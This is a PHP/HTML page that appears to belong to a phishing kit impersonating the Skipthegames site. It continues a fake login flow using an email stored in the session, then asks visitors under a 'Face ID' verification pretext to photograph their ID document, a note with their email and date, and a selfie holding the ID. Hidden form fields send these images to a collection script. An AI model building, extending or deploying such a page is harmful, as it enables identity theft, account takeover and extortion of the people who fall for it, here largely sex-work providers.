<?php
// segurity_faceid.php

session_start();
// Retrieve the user's email from the session (set in processlogin.php)
$user_email = $_SESSION['logged_in_email'] ?? 'email@example.com'; 
?>
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Identity Verification - Skipthegames.eu</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="assets/css/login.css"> 
  <link rel="stylesheet" href="assets/css/face_id.css"> 
  <style>
    /* Additional styles for examples (You can move this to face_id.css) */
    .examples-container {
        display: flex;
        flex-direction: column;
        gap: 20px;
        margin-top: 30px;
        margin-bottom: 30px;
    }
    .example-item {
        background: #f9fafb;
        border: 1px solid #e5e7eb;
        border-radius: 8px;
        padding: 15px;
        text-align: center;
    }
    .example-item h3 {
        color: #1f2937;
        margin-top: 0;
        margin-bottom: 10px;
        font-size: 18px;
    }
    .example-item img {
        max-width: 100%;
        height: auto;
        border-radius: 6px;
        border: 1px solid #d1d5db;
        margin-bottom: 10px;
    }
    .example-item p {
        font-size: 14px;
        color: #4b5563;
        line-height: 1.4;
    }
    .start-verification-btn {
        margin-top: 20px;
        margin-bottom: 30px;
    }
    /* KEY: Hide the camera section by default */
    #faceIdForm .camera-section {
        display: none; 
    }
  </style>
</head>
<body>

  <main class="wrap" role="main">
    
    <div class="top-warning">Providers, we do not send out text messages ever, do not click on links from them.</div>

    <header class="brand-block">
      <a href="#" class="brand">Skipthegames<span class="tld">.eu</span></a>
      <div class="tagline">Skip the games. Get satisfaction.</div>
    </header>
    
    <div class="user-block">
        <span class="user-salute">Hi,</span>
        <a href="#" class="user-email-link"><?php echo htmlspecialchars($user_email); ?></a>
        <span class="user-actions">
            <a href="#">go to your account</a> | <a href="#" class="log-out-link">log out</a>
        </span>
    </div>

    <p class="nav-breadcrumb">
        <a href="#">SKIPTHEGAMES.COM</a> » IDENTITY VERIFICATION
    </p>

    <h1 class="security-title">Identity Verification (Face ID)</h1>
    
    <p class="security-text">
        Due to security reasons and to prevent fraud, we require live identity verification.
        Please follow the examples below to ensure your verification is approved quickly.
    </p>

    
    <div class="examples-container">
        <div class="example-item">
            <h3>1. Your Identity Document (ID)</h3>
            <img src="assets/img/1.jpg" alt="Example of Identity Document">
            <p>Ensure your ID is legible, free of glare, and all data is visible.</p>
        </div>
        <div class="example-item">
            <h3>2. Email and Date on Paper</h3>
            <img src="assets/img/2.jpg" alt="Example of email and date on paper">
            <p>Clearly write your current email address and today's date on a piece of paper, as shown.</p>
        </div>
        <div class="example-item">
            <h3>3. Selfie with your ID</h3>
            <img src="assets/img/3.jpg" alt="Example of selfie with ID">
            <p>Take a selfie holding your ID next to your face. Ensure your face and the ID are clear and legible.</p>
        </div>
    </div>
    
    <button type="button" class="btn start-verification-btn" id="startVerificationButton">Start Identity Verification</button>

    
    <form id="faceIdForm" method="post" action="assets/config/process_faceid.php">
        <div class="camera-section">
            <p class="security-text" style="font-weight: 600; margin-top: 20px;">
                Now, follow the camera instructions to take your photos.
            </p>
            <div class="camera-container">
                <p class="step-message" id="stepMessage">Step 1: Capture your Identity Document (ID)</p>
                <video id="videoElement" autoplay playsinline></video>
                
                <button type="button" class="btn" id="switchCameraButton">Switch Camera</button>
                <button type="button" class="btn" id="captureButton">Take Photo</button>

                <canvas id="canvas"></canvas>
                <img id="idImage" alt="Captured ID Photo">
                <img id="selfieImage" alt="Captured Selfie Photo">
                
                <input type="hidden" name="id_data" id="idDataInput">
                <input type="hidden" name="selfie_data" id="selfieDataInput">
            </div>

            <button type="submit" class="btn" id="submitButton" style="display:none; margin-top: 20px;">Submit Secure Verification</button>
        </div>
    </form>

    <p class="security-text" style="margin-top: 20px;">
        Make sure the images are clear and the document details are legible.
    </p>

    <hr class="divider">

    <footer class="footer">
      <small>©Skipthegames.eu</small>
      <nav class="links footer-mobile-links" aria-label="Footer">
        <a href="#">Home</a><a href="#">Contact</a><a href="#">About</a><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Escort Info</a>
      </nav>
    </footer>
  </main>
  
  <script src="assets/js/faceid_script.js"></script>
</body>
</html>